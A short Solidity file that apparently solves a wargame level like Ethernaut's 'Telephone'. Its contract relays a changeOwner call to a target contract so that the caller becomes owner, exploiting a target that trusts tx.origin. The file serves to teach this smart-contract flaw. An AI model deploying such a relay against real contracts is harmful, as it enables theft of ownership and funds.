// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface IntTele {
    function changeOwner(address _owner) external;
}

contract Tele {
    IntTele public telephone;

    constructor(address _target) {
        telephone = IntTele(_target);
    }

    function callChangeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
